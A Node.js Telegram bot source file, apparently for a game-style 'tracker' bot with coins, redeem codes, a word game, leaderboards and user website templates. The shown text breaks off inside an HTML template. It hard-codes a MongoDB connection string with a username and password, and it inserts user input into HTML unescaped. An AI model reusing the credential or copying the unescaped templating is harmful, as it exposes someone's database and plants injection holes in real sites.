// =====================================================
// 🎮🔥 SLIME TRACKERX v22.0 - ULTIMATE GOD EDITION 🔥🎮
// =====================================================

const { Telegraf, Markup } = require("telegraf");
const express = require("express");
const bodyParser = require("body-parser");
const path = require("path");
const crypto = require("crypto");
const mongoose = require("mongoose");
const fs = require("fs-extra");
const multer = require("multer");
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const compression = require('compression');

const bot = new Telegraf(process.env.BOT_TOKEN);
const app = express();

// ========== SECURITY MIDDLEWARE ==========
app.use(helmet({ contentSecurityPolicy: false }));
app.use(compression());
app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 100 }));

// ========== FILE UPLOAD SETUP ==========
const storage = multer.diskStorage({
  destination: (req, file, cb) => cb(null, 'uploads/'),
  filename: (req, file, cb) => cb(null, Date.now() + '-' + file.originalname)
});
const upload = multer({ 
  storage, 
  limits: { fileSize: 10 * 1024 * 1024 },
  fileFilter: (req, file, cb) => {
    const allowed = /jpeg|jpg|png|gif|webp/;
    const ext = allowed.test(path.extname(file.originalname).toLowerCase());
    const mime = allowed.test(file.mimetype);
    cb(null, mime && ext);
  }
});

// ========== SETUP ==========
app.use(bodyParser.json({ limit: "100mb" }));
app.use(express.static(path.join(__dirname, "public")));
app.use("/websites", express.static(path.join(__dirname, "websites")));
app.use("/uploads", express.static(path.join(__dirname, "uploads")));

fs.ensureDirSync(path.join(__dirname, "websites"));
fs.ensureDirSync(path.join(__dirname, "uploads"));
fs.ensureDirSync(path.join(__dirname, "public"));

// ========== MONGODB CONNECTION ==========
const MONGODB_URI = process.env.MONGODB_URI || "mongodb+srv://mrdev:dev091339@cluster0.grjlq7v.mongodb.net/trackerx?retryWrites=true&w=majority";

mongoose.connect(MONGODB_URI)
  .then(() => console.log('✅ MongoDB Connected!'))
  .catch(err => console.log('❌ MongoDB Error:', err));

// ========== SCHEMAS ==========
const userSchema = new mongoose.Schema({
  userId: { type: Number, unique: true, required: true },
  username: String,
  firstName: String,
  joinDate: { type: Date, default: Date.now },
  lastActive: Date,
  coins: { type: Number, default: 15 },
  diamonds: { type: Number, default: 0 },
  totalEarned: { type: Number, default: 15 },
  totalSpent: { type: Number, default: 0 },
  referrals: { type: Number, default: 0 },
  referrer: { type: Number, default: null },
  hacks: { type: Number, default: 0 },
  hackedUsers: { type: [Number], default: [] },
  level: { type: Number, default: 1 },
  xp: { type: Number, default: 0 },
  streak: { type: Number, default: 0 },
  lastDaily: Date,
  games: { type: Number, default: 0 },
  wins: { type: Number, default: 0 },
  losses: { type: Number, default: 0 },
  badges: { type: [String], default: ["🎁 Newbie"] },
  wordWins: { type: Number, default: 0 },
  wordLosses: { type: Number, default: 0 },
  totalEarnedFromWords: { type: Number, default: 0 },
  websites: { type: [Object], default: [] },
  isAdmin: { type: Boolean, default: false },
  casinoWins: { type: Number, default: 0 },
  tournamentWins: { type: Number, default: 0 },
  lotteryTickets: { type: Number, default: 0 },
  dailyQuests: { type: Object, default: {} },
  achievements: { type: [String], default: [] },
  menuGif: { type: String, default: null }
});

const codeSchema = new mongoose.Schema({
  code: { type: String, unique: true, required: true },
  coins: Number,
  diamonds: { type: Number, default: 0 },
  usedBy: [Number],
  maxUses: { type: Number, default: 20 },
  left: Number,
  expire: Date,
  createdAt: { type: Date, default: Date.now }
});

const websiteSchema = new mongoose.Schema({
  name: String,
  ownerId: Number,
  ownerUsername: String,
  template: String,
  content: Object,
  url: String,
  views: { type: Number, default: 0 },
  likes: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const tournamentSchema = new mongoose.Schema({
  id: String,
  name: String,
  entryFee: Number,
  prizePool: Number,
  players: [Number],
  winner: { type: Number, default: null },
  status: { type: String, default: "waiting" }
});

const User = mongoose.model('User', userSchema);
const Code = mongoose.model('Code', codeSchema);
const Website = mongoose.model('Website', websiteSchema);
const Tournament = mongoose.model('Tournament', tournamentSchema);

// ========== CONFIG ==========
const DOMAIN = process.env.DOMAIN || "https://virtualnumbersfree.onrender.com";
const CHANNEL = process.env.CHANNEL || "@devxtechzone";
const OWNER_ID = parseInt(process.env.OWNER_ID) || 6170894121;

// ========== ECONOMY ==========
const TRACK_COST = 10;
const NEW_COINS = 15;
const REF_REWARD = 10;
const DAILY_REWARD = 5;
const WORK_REWARD = 2;
const WORK_CD = 12 * 60 * 60 * 1000;
const WORD_MIN_BET = 5;
const WORD_MAX_BET = 500;
const WEB_PRICE = 15;

// ========== DIFFICULTY LEVELS ==========
const difficultyLevels = {
  "easy": { name: "🍃 EASY", timer: 45, multiplier: 0.8, color: "🟢", letters: 3, reward: 1 },
  "medium": { name: "⚡ MEDIUM", timer: 30, multiplier: 1.0, color: "🟡", letters: 4, reward: 1.5 },
  "hard": { name: "🔥 HARD", timer: 15, multiplier: 1.5, color: "🟠", letters: 5, reward: 2 },
  "expert": { name: "💀 EXPERT", timer: 8, multiplier: 2.0, color: "🔴", letters: 6, reward: 3 }
};

// ========== WORD DATABASE ==========
const wordsByLength = {

  3: [
    "CAT","DOG","SUN","CAR","BAG","HAT","LEG","EYE","CUP","BED",
    "RED","HOT","BIG","NEW","OLD","FUN","RUN","SIT","EAT","FLY",
    "CRY","JOY","SAD","WET","DRY","FAT","RAT","BAT","MAT","PAT",
    "SAT","HEN","PEN","DEN","MEN","TEN","NET","PET","GET","JET",
    "SET","BET","LET","MET","YET","ZIP","LIP","TIP","HIP","DIP",
    "RIP","SIP","NIP","MAP","CAP","TAP","GAP","LAP","SAP","NAP",
    "VAN","MAN","CAN","PAN","FAN","BAN","RAN","WAN","HIT","KIT",
    "BIT","FIT","PIT","WIT","ROW","COW","HOW","NOW","LOW","BOW",
    "TOW","TOY","BOY","DAY","WAY","PAY","SAY","KEY","HEY","ICE",
    "ACE","AGE","ARE","AND","END","INK","OWL","EAR","ARM","ANT"
  ],

  4: [
    "FISH","BIRD","FROG","STAR","MOON","TREE","WIND","FIRE","ROCK","SAND",
    "SHIP","KING","RING","SING","WING","BOOK","COOK","LOOK","HOOK","TOOK",
    "LION","BEAR","WOLF","DEER","GOAT","COWS","PIGS","DUCK","SWAN","SEAL",
    "ROAD","PATH","WALL","DOOR","ROOF","ROOM","HALL","YARD","GATE","FARM",
    "BLUE","PINK","GRAY","GOLD","SILK","WOOL","CASH","COIN","NOTE","BANK",
    "TIME","YEAR","WEEK","DAY","HOUR","MATH","CODE","DATA","FILE","FORM",
    "PLAY","GAME","TEAM","GOAL","PASS","KICK","RACE","JUMP","DIVE","SWIM",
    "FOOD","RICE","MEAT","CAKE","SOUP","BREAD","MILK","EGGS","SALT","SPIN",
    "RAIN","SNOW","HEAT","COLD","MIST","FOG","HAIL","CLAY","HAND","HEAD"
  ],

  5: [
    "APPLE","MANGO","GRAPE","BERRY","PEACH","LEMON","MELON","GUAVA","OLIVE","PLUMS",
    "HOUSE","TABLE","CHAIR","COUCH","SHELF","PLATE","GLASS","SPOON","FORKS","KNIFE",
    "HAPPY","SMART","BRAVE","CALM","KIND","PROUD","SHARP","QUICK","SWEET","TOUGH",
    "LIGHT","CLEAR","CLEAN","DIRTY","FRESH","DRIED","SOFTS","HARDS","BRISK","SOLID",
    "WATER","RIVER","OCEAN","LAKES","BEACH","SHORE","WAVES","TIDES","DEPTH","FLOAT",
    "PLANT","GRASS","TREES","LEAFY","ROOTS","BLOOM","FRUIT","SEEDS","GREEN","GROWN",
    "MONEY","VALUE","PRICE","COSTS","SPEND","SAVES","LOANS","TRADE","STOCK","BANKS",
    "POWER","FORCE","SPEED","MOTOR","DRIVE","WHEEL","TRACK","ROUTE","PATHS","WORLD",
    "EARTH","SPACE","STARS","PLANE","ROBOT","DRONE","ORBIT","SOLAR","PEACE","UNITY"
  ],

  6: [
    "BANANA","ORANGE","PURPLE","YELLOW","SILVER","GOLDEN","BRONZE","COPPER","MARBLE","IVORYS",
    "RABBIT","TIGERS","EAGLES","SHARKS","WHALES","ZEBRAS","SNAKES","WOLVES","BEARS","FOXES",
    "HORSES","CATTLE","SHEEPS","GOATS","CHICKS","DUCKS","TURKEY","PIGEON","CROWDS","SPAROW",
    "BUTTER","CHEESE","BREADS","SUGARS","SALTED","PEPPER","HONEYX","MILKSS","COFFEE","TEAALL",
    "JUICES","WATERS","DRINKS","SMOOTH","BITTER","SWEETS","FLAVOR","TASTES","DINNER","LUNCHS",
    "GARDEN","PALACE","CASTLE","TEMPLE","CHURCH","MOSQUE","SCHOOL","COLLEG","OFFICE","MARKET",
    "STREET","AVENUE","HIGHWY","BRIDGE","TUNNEL","STATION","AIRPORT","HARBOR","CENTER","PLAZAS",
    "PLAYER","DRIVER","WRITER","READER","SINGER","DANCER","ACTORS","MAKERS","CREATE","DESIGN",
    "CODING","DEBUGS","SYSTEM","SERVER","CLIENT","NETWORK","SECURE","ACCESS","MEMORY","STORED"
  ],

  7: [
    "ANIMALS","FARMERS","HUNTERS","FISHERS","DRIVERS","PLAYERS","WRITERS","READERS","SINGERS","DANCERS",
    "TEACHER","STUDENT","DOCTORS","LAWYERS","BANKERS","WORKERS","LEADERS","MANAGER","OFFICER","AGENTS",
    "FREEDOM","JUSTICE","COURAGE","LOYALTY","HONESTY","KINDNESS","HAPPILY","SADNESS","MADNESS","GOODMAN",
    "NETWORK","SYSTEMS","PROGRAM","CODINGS","DEBUGGS","SERVERS","CLIENTS","SECURES","STORAGE","PROCESS",
    "COUNTRY","VILLAGE","CITIES","STREETS","MARKETS","SHOPS","MALLS","STORES","HOUSES","BUILDNG",
    "FASHION","CLOTHES","SHIRTS","TROUSER","JACKETS","SHOES","SANDALS","HATS","BELTS","WATCHES",
    "WEATHER","RAINING","SNOWING","SUNRISE","SUNSETS","STORMS","THUNDER","BREEZES","CLIMATE","SEASONS",
    "ANCIENT","MODERNS","FUTURES","HISTORY","SCIENCE","BIOLOGY","PHYSICS","CHEMIST","MATHS","LOGICAL"
  ],

  8: [
    "ELEPHANT","GIRAFFES","KANGAROO","DOLPHINS","PENGUINS","COMPUTER","KEYBOARD","MONITOR","PRINTER","SCANNER",
    "ROUTERS","NETWORKS","DATABASE","SOFTWARE","HARDWARE","SECURITY","FIREWALL","INTERNET","BROWSERS","PROGRAMS",
    "BEAUTIFUL","WONDERFUL","EXCITING","ADVENTURE","MYSTERY","JOURNEY","DISCOVER","EXPLORE","CHALLENGE","VICTORY",
    "STRENGTH","COURAGES","FRIENDSH","HAPPINES","POWERFUL","CREATIVE","THINKING","LEARNING","TEACHING","BUILDING",
    "PLANNING","STRATEGY","BUSINESS","MARKETING","FINANCES","ECONOMY","INDUSTRY","COMPANYS","PRODUCTS","SERVICES",
    "CUSTOMER","SUPPORTS","DELIVERY","LOGISTICS","MANAGERS","LEADERSH","TEAMWORK","SUCCESSS","FAILURES","PROGRESS"
  ],

  9: [
    "INCREDIBLE","IMPORTANT","DIFFERENT","INTERESTS","KNOWLEDGE","EDUCATION","DEVELOPER","HAPPINESS","BEAUTIFUL",
    "POWERFULL","CREATIVES","STRONGEST","BRIGHTEST","DARKESTLY","SOFTESTLY","HARDESTLY","COMPUTERS","PROGRAMER",
    "SOFTWARES","DATABASES","NETWORKED","SECURITYS","FIREWALLS","INTERNETS","BROWSINGS","MARKETING","FINANCIAL",
    "BUSINESSS","INDUSTRYS","COMPANIES","PRODUCTLY","SERVICESS","CUSTOMERS","SUPPORTLY","DELIVERYS","LOGISTICS",
    "MANAGEMENT","LEADERSHP","TEAMWORKS","SUCCESSES","FAILURES","PROGRESSES","STRATEGYS","OPERATIONS","PLANNINGS"
  ]

};

function getRandomWordByLength(length) {
  let words = wordsByLength[length] || wordsByLength[5];
  return words[Math.floor(Math.random() * words.length)];
}

// ========== MEMORY CACHE ==========
let usersCache = new Map();
let codesCache = new Map();
let tokens = new Map();
let workCD = new Map();
let bannedUsers = new Set();
let processedMessages = new Set();
let wordChallenges = new Map();
let webBuilds = new Map();
let activeTournaments = new Map();
let lotteryPool = 0;
let lotteryEntries = [];

// ========== LOAD DATA ==========
async function loadData() {
  try {
    const allUsers = await User.find({});
    for (const user of allUsers) usersCache.set(user.userId, user);
    console.log(`📂 Loaded ${usersCache.size} users`);
    
    const allCodes = await Code.find({ expire: { $gt: new Date() } });
    for (const code of allCodes) codesCache.set(code.code, code);
    console.log(`📂 Loaded ${codesCache.size} active codes`);
    
    const activeTours = await Tournament.find({ status: "waiting" });
    for (const tour of activeTours) activeTournaments.set(tour.id, tour);
  } catch(e) { console.log("Error loading data:", e); }
}

async function saveUser(userId, data) {
  try {
    await User.findOneAndUpdate({ userId: userId }, data, { upsert: true });
    usersCache.set(userId, data);
  } catch(e) { console.log("Error saving user:", e); }
}

async function initUser(userId, referrerId = null) {
  let user = usersCache.get(userId);
  if (!user) {
    let username = null;
    let firstName = null;
    try {
      const chat = await bot.telegram.getChat(userId);
      username = chat.username;
      firstName = chat.first_name;
    } catch(e) {}
    
    user = {
      userId: userId,
      username: username,
      firstName: firstName,
      joinDate: new Date(),
      lastActive: new Date(),
      coins: NEW_COINS,
      diamonds: 0,
      totalEarned: NEW_COINS,
      totalSpent: 0,
      referrals: 0,
      referrer: referrerId,
      hacks: 0,
      hackedUsers: [],
      level: 1,
      xp: 0,
      streak: 0,
      lastDaily: null,
      games: 0,
      wins: 0,
      losses: 0,
      badges: ["🎁 Newbie"],
      wordWins: 0,
      wordLosses: 0,
      totalEarnedFromWords: 0,
      websites: [],
      isAdmin: userId === OWNER_ID,
      casinoWins: 0,
      tournamentWins: 0,
      lotteryTickets: 0,
      dailyQuests: {},
      achievements: [],
      menuGif: null
    };
    await saveUser(userId, user);
    
    if (referrerId && referrerId !== userId) {
      let referrer = usersCache.get(referrerId);
      if (referrer) {
        referrer.coins += REF_REWARD;
        referrer.referrals += 1;
        referrer.totalEarned += REF_REWARD;
        if (!referrer.badges.includes("🌟 Recruiter")) referrer.badges.push("🌟 Recruiter");
        await saveUser(referrerId, referrer);
        bot.telegram.sendMessage(referrerId, `🎉 NEW REFERRAL! +${REF_REWARD} COINS\n💰 ${referrer.coins} coins | 👥 ${referrer.referrals} refs`);
      }
    }
  }
  return user;
}

async function addCoin(userId, amt) {
  let user = usersCache.get(userId);
  if (user) {
    user.coins += amt;
    user.totalEarned += amt;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function takeCoin(userId, amt) {
  let user = usersCache.get(userId);
  if (user && user.coins >= amt) {
    user.coins -= amt;
    user.totalSpent += amt;
    await saveUser(userId, user);
    return true;
  }
  return false;
}

async function addXP(userId, amount) {
  let user = usersCache.get(userId);
  if (user) {
    user.xp += amount;
    let needed = user.level * 100;
    if (user.xp >= needed) {
      user.xp -= needed;
      user.level += 1;
      let reward = user.level * 5;
      user.coins += reward;
      await saveUser(userId, user);
      bot.telegram.sendMessage(userId, `🎉 LEVEL UP! Level ${user.level}! +${reward} COINS`);
    } else {
      await saveUser(userId, user);
    }
    return true;
  }
  return false;
}

async function getUsername(userId) {
  let user = usersCache.get(userId);
  if (user && user.username) return user.username;
  try {
    let chat = await bot.telegram.getChat(userId);
    return chat.username || `User_${userId}`;
  } catch {
    return `User_${userId}`;
  }
}

function refLink(id) {
  return `https://t.me/${bot.botInfo?.username || 'trackersxbot'}?start=ref_${id}`;
}

async function checkJoin(ctx) {
  try {
    let m = await ctx.telegram.getChatMember(CHANNEL, ctx.from.id);
    return ["creator", "administrator", "member"].includes(m.status);
  } catch {
    return false;
  }
}

// ========== REDEEM CODE SYSTEM ==========
async function genCode(coins, diamonds = 0, uses = 20, hours = 24) {
  let code = crypto.randomBytes(6).toString("hex").toUpperCase();
  let expire = new Date(Date.now() + (hours * 3600000));
  
  let codeData = new Code({
    code: code,
    coins: coins,
    diamonds: diamonds,
    usedBy: [],
    maxUses: Math.min(uses, 20),
    left: Math.min(uses, 20),
    expire: expire
  });
  
  await codeData.save();
  codesCache.set(code, codeData);
  return code;
}

async function redeemCode(userId, code) {
  try {
    let c = codesCache.get(code.toUpperCase());
    if (!c) {
      c = await Code.findOne({ code: code.toUpperCase(), expire: { $gt: new Date() } });
      if (!c) return { ok: false, msg: "❌ Invalid code!" };
    }
    
    if (Date.now() > c.expire) {
      codesCache.delete(code);
      return { ok: false, msg: "❌ Code expired!" };
    }
    
    if (c.left <= 0) return { ok: false, msg: "❌ Code already used up!" };
    if (c.usedBy.includes(userId)) return { ok: false, msg: "❌ You already used this code!" };
    
    await addCoin(userId, c.coins);
    if (c.diamonds > 0) {
      let user = usersCache.get(userId);
      user.diamonds += c.diamonds;
      await saveUser(userId, user);
    }
    
    c.usedBy.push(userId);
    c.left -= 1;
    await c.save();
    codesCache.set(c.code, c);
    
    let user = usersCache.get(userId);
    return { ok: true, msg: `✅ Redeemed ${c.coins} coins!${c.diamonds > 0 ? ` +${c.diamonds}💎` : ''}`, coins: c.coins, newBalance: user.coins };
    
  } catch(e) {
    console.error("Redeem error:", e);
    return { ok: false, msg: "❌ Error redeeming code!" };
  }
}

// ========== LEADERBOARD ==========
async function getLeaderboard(type = "coins", limit = 15) {
  let users = Array.from(usersCache.values());
  
  let sorted;
  switch(type) {
    case "coins":
      sorted = users.sort((a, b) => b.coins - a.coins);
      break;
    case "level":
      sorted = users.sort((a, b) => b.level - a.level);
      break;
    case "wins":
      sorted = users.sort((a, b) => b.wins - a.wins);
      break;
    case "wordwins":
      sorted = users.sort((a, b) => b.wordWins - a.wordWins);
      break;
    case "referrals":
      sorted = users.sort((a, b) => b.referrals - a.referrals);
      break;
    case "hacks":
      sorted = users.sort((a, b) => b.hacks - a.hacks);
      break;
    default:
      sorted = users.sort((a, b) => b.coins - a.coins);
  }
  
  let leaderboard = [];
  for (let i = 0; i < Math.min(limit, sorted.length); i++) {
    let name = await getUsername(sorted[i].userId);
    let value = sorted[i][type];
    leaderboard.push({ rank: i + 1, name, value, userId: sorted[i].userId });
  }
  return leaderboard;
}

bot.command("leaderboard", async (ctx) => {
  let args = ctx.message.text.split(" ");
  let type = args[1] || "coins";
  
  const types = {
    "coins": { emoji: "💰", name: "RICHEST", icon: "💎" },
    "level": { emoji: "📊", name: "HIGHEST LEVEL", icon: "⭐" },
    "wins": { emoji: "🏆", name: "MOST WINS", icon: "🎮" },
    "wordwins": { emoji: "📝", name: "WORD CHAMPIONS", icon: "🔤" },
    "referrals": { emoji: "👥", name: "TOP REFERRERS", icon: "🤝" },
    "hacks": { emoji: "💀", name: "TOP HACKERS", icon: "🔪" }
  };
  
  if (!types[type]) {
    return ctx.reply(`🏆 **LEADERBOARD TYPES** 🏆\n\n` +
      `💰 /leaderboard coins - Richest users\n` +
      `📊 /leaderboard level - Highest level\n` +
      `🏆 /leaderboard wins - Most game wins\n` +
      `📝 /leaderboard wordwins - Word battle champs\n` +
      `👥 /leaderboard referrals - Top referrers\n` +
      `💀 /leaderboard hacks - Top hackers`, { parse_mode: "Markdown" });
  }
  
  let leaderboard = await getLeaderboard(type, 15);
  let message = `${types[type].emoji} **${types[type].name} LEADERBOARD** ${types[type].emoji}\n\n`;
  
  for (let entry of leaderboard) {
    let medal = entry.rank === 1 ? "🥇" : entry.rank === 2 ? "🥈" : entry.rank === 3 ? "🥉" : `${entry.rank}.`;
    let valueDisplay = type === "coins" ? `${entry.value.toLocaleString()} 🪙` : 
                       type === "level" ? `Lvl ${entry.value}` :
                       type === "wins" ? `${entry.value} 🎮` :
                       type === "wordwins" ? `${entry.value} 📝` :
                       type === "referrals" ? `${entry.value} 👥` :
                       `${entry.value} 💀`;
    message += `${medal} @${entry.name} - ${valueDisplay}\n`;
  }
  
  // Add user's own rank
  let user = await initUser(ctx.from.id);
  let allUsers = Array.from(usersCache.values());
  let sorted = allUsers.sort((a, b) => {
    if (type === "coins") return b.coins - a.coins;
    if (type === "level") return b.level - a.level;
    if (type === "wins") return b.wins - a.wins;
    if (type === "wordwins") return b.wordWins - a.wordWins;
    if (type === "referrals") return b.referrals - a.referrals;
    return b.hacks - a.hacks;
  });
  let userRank = sorted.findIndex(u => u.userId === ctx.from.id) + 1;
  let userValue = user[type];
  
  message += `\n━━━━━━━━━━━━━━━━\n🎯 **YOUR RANK:** #${userRank}\n`;
  if (type === "coins") message += `💰 ${userValue} coins`;
  else if (type === "level") message += `⭐ Level ${userValue}`;
  else if (type === "wins") message += `🎮 ${userValue} wins`;
  else if (type === "wordwins") message += `📝 ${userValue} word wins`;
  else if (type === "referrals") message += `👥 ${userValue} referrals`;
  else message += `💀 ${userValue} hacks`;
  
  message += `\n\n✨ Compete and climb the ranks! ✨`;
  await ctx.reply(message, { parse_mode: "Markdown" });
});

// ========== ALL DOPE HTML TEMPLATES ==========
const htmlTemplates = {
  portfolio: (data) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${data.name || 'Portfolio'} | SLIME TRACKERX</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Poppins',sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;min-height:100vh}
.container{max-width:1200px;margin:0 auto;padding:20px}
.navbar{display:flex;justify-content:space-between;padding:20px 0;flex-wrap:wrap}
.logo{font-size:28px;font-weight:800;background:linear-gradient(45deg,#fff,#ffd700);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.nav-links a{color:#fff;margin-left:25px;text-decoration:none;transition:0.3s;font-weight:500}
.nav-links a:hover{color:#ffd700;transform:translateY(-2px);display:inline-block}
.hero{text-align:center;padding:100px 20px}
.hero h1{font-size:64px;margin-bottom:20px;animation:fadeInUp 1s}
.hero p{font-size:24px;opacity:0.9;margin-bottom:30px}
.btn{background:linear-gradient(45deg,#ffd700,#ff8c00);color:#1a1a2e;padding:15px 45px;border-radius:50px;text-decoration:none;display:inline-block;font-weight:700;transition:transform 0.3s,box-shadow 0.3s}
.btn:hover{transform:scale(1.05);box-shadow:0 10px 30px rgba(0,0,0,0.3)}
.section{background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);border-radius:30px;padding:50px;margin:40px 0}
.section h2{font-size:32px;margin-bottom:20px}
.skills{display:flex;gap:15px;flex-wrap:wrap;margin-top:20px}
.skill{background:linear-gradient(135deg,#667eea,#764ba2);padding:12px 30px;border-radius:30px;font-weight:500}
footer{text-align:center;padding:40px;border-top:1px solid rgba(255,255,255,0.2)}
@keyframes fadeInUp{from{opacity:0;transform:translateY(30px)}to{opacity:1;transform:translateY(0)}}
@media(max-width:768px){.navbar{flex-direction:column;text-align:center;gap:15px}.hero h1{font-size:40px}.section{padding:30px}}
</style>
</head>
<body>
<div class="container">
<div class="navbar">
<div class="logo"><i class="fas fa-code"></i> ${data.name || 'Portfolio'}</div>
<div class="nav-links"><a href="#home">Home</a><a href="#about">About</a><a href="#contact">Contact</a></div>
</div>
<div class="hero" id="home">
<h1>${data.name || 'Welcome'}</h1>
<p>${data.title || 'Creative Developer & Designer'}</p>
<a href="#" class="btn"><i class="fas fa-paper-plane"></i> Contact Me</a>
</div>
<div class="section" id="about">
<h2><i class="fas fa-user-astronaut"></i> About Me</h2>
<p>${data.bio || 'Passionate creator building amazing digital experiences. I love turning ideas into reality through code and design.'}</p>
<div class="skills">
<span class="skill"><i class="fab fa-react"></i> ${data.skill1 || 'React'}</span>
<span class="skill"><i class="fab fa-node"></i> ${data.skill2 || 'Node.js'}</span>
<span class="skill"><i class="fas fa-database"></i> ${data.skill3 || 'MongoDB'}</span>
</div>
</div>
<footer><p><i class="fas fa-fire"></i> Built with SLIME TRACKERX Web Creator | ${new Date().getFullYear()}</p></footer>
</div>
</body>
</html>`,

  gaming: (data) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>${data.gamertag || 'Gamer'} | SLIME TRACKERX</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0a;color:#0f0;font-family:'Orbitron',monospace;background-image:radial-gradient(circle at 10% 20%, rgba(0,255,0,0.1) 0%, transparent 50%);min-height:100vh}
.navbar{background:#000;padding:20px;border-bottom:3px solid #0f0;text-align:center;font-size:28px;font-weight:800;text-shadow:0 0 10px #0f0;letter-spacing:2px}
.navbar i{margin:0 10px}
.hero{min-height:90vh;display:flex;align-items:center;justify-content:center;text-align:center;flex-direction:column}
.hero h1{font-size:72px;margin-bottom:20px;animation:glitch 3s infinite}
.hero p{font-size:24px;margin-bottom:30px;color:#ccc}
.btn{background:linear-gradient(45deg,#0f0,#0a0);color:#000;padding:15px 50px;border:none;cursor:pointer;font-weight:800;font-size:18px;transition:0.3s;border-radius:50px;font-family:'Orbitron',monospace}
.btn:hover{box-shadow:0 0 30px #0f0;transform:scale(1.05)}
.games{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:30px;padding:60px;max-width:1200px;margin:0 auto}
.game-card{background:#1a1a1a;border:1px solid #0f0;border-radius:20px;padding:40px 30px;text-align:center;transition:0.3s;cursor:pointer}
.game-card:hover{transform:translateY(-10px);box-shadow:0 0 40px rgba(0,255,0,0.3)}
.game-card i{font-size:48px;margin-bottom:20px;color:#0f0}
.game-card h3{font-size:24px;margin-bottom:10px}
.game-card p{color:#888;font-size:14px}
.stats{display:flex;justify-content:center;gap:50px;margin-top:50px}
.stat{text-align:center}
.stat-value{font-size:36px;font-weight:800;color:#0f0}
.stat-label{font-size:12px;color:#888}
@keyframes glitch{0%,100%{text-shadow:3px 0 red,-3px 0 blue}33%{text-shadow:-3px 0 red,3px 0 blue}}
footer{text-align:center;padding:40px;border-top:1px solid #0f0;margin-top:50px}
@media(max-width:768px){.hero h1{font-size:40px}.games{padding:30px}}
</style>
</head>
<body>
<div class="navbar"><i class="fas fa-gamepad"></i> ${data.gamertag || 'GAMING HUB'} <i class="fas fa-fire"></i></div>
<div class="hero">
<h1>${data.gamertag || 'GAMER'}</h1>
<p>${data.tagline || 'Level Up Your Gaming Experience'}</p>
<button class="btn"><i class="fab fa-twitch"></i> WATCH LIVE</button>
<div class="stats">
<div class="stat"><div class="stat-value">1.2K</div><div class="stat-label">FOLLOWERS</div></div>
<div class="stat"><div class="stat-value">347</div><div class="stat-label">WINS</div></div>
<div class="stat"><div class="stat-value">89%</div><div class="stat-label">WIN RATE</div></div>
</div>
</div>
<div class="games">
<div class="game-card"><i class="fas fa-crown"></i><h3>${data.game1 || 'Apex Legends'}</h3><p>Battle Royale • Predator Rank</p></div>
<div class="game-card"><i class="fas fa-skull"></i><h3>${data.game2 || 'Valorant'}</h3><p>Tactical Shooter • Radiant</p></div>
<div class="game-card"><i class="fas fa-trophy"></i><h3>${data.game3 || 'CS:GO'}</h3><p>Competitive FPS • Global Elite</p></div>
</div>
<footer><p><i class="fas fa-fire"></i> Built with SLIME TRACKERX | ${new Date().getFullYear()}</p></footer>
</body>
</html>`,

  business: (data) => `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>${data.company || 'Business'} | SLIME TRACKERX</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#f8f9fa}
.navbar{background:#1a1a2e;color:#fff;display:flex;justify-content:space-between;padding:25px 50px;flex-wrap:wrap}
.logo{font-size:28px;font-weight:800}
.logo span{color:#667eea}
.nav-links a{color:#fff;margin-left:30px;text-decoration:none;transition:0.3s}
.nav-links a:hover{color:#667eea}
.hero{background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;text-align:center;padding:120px 20px}
.hero h1{font-size:56px;margin-bottom:20px}
.hero p{font-size:20px;margin-bottom:30px;opacity:0.9}
.btn{background:#fff;color:#667eea;padding:15px 45px;border-radius:50px;text-decoration:none;display:inline-block;font-weight:700;transition:0.3s}
.btn:hover{transform:scale(1.05);box-shadow:0 10px 30px rgba(0,0,0,0.2)}
.container{max-width:1200px;margin:0 auto;padding:80px 20px}
.section-title{text-align:center;font-size:36px;margin-bottom:50px}
.services{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:30px}
.service{background:#fff;border-radius:20px;padding:40px 30px;text-align:center;box-shadow:0 5px 30px rgba(0,0,0,0.05);transition:0.3s}
.service:hover{transform:translateY(-10px);box-shadow:0 15px 40px rgba(0,0,0,0.1)}
.service i{font-size:50px;color:#667eea;margin-bottom:20px}
.service h3{font-size:22px;margin-bottom:15px}
.contact-section{background:#1a1a2e;color:#fff;text-align:center;padding:80px 20px}
.contact-info{display:flex;justify-content:center;gap:50px;flex-wrap:wrap;margin-top:40px}
.contact-info div i{font-size:30px;margin-bottom:10px}
footer{text-align:center;padding:40px;background:#0f0f1a;color:#fff}
@media(max-width:768px){.navbar{flex-direction:column;text-align:center;gap:20px}.hero h1{font-size:36px}}
</style>
</head>
<body>
<div class="navbar"><div class="logo"><span>🏢</span> ${data.company || 'Business'}</div><div class="nav-links"><a href="#">Home</a><a href="#">Services</a><a href="#">Contact</a></div></div>
<div class="hero"><h1>${data.company || 'Welcome to Our Business'}</h1><p>${data.tagline || 'Excellence in Every Service'}</p><a href="#" class="btn">Get Started <i class="fas fa-arrow-right"></i></a></div>
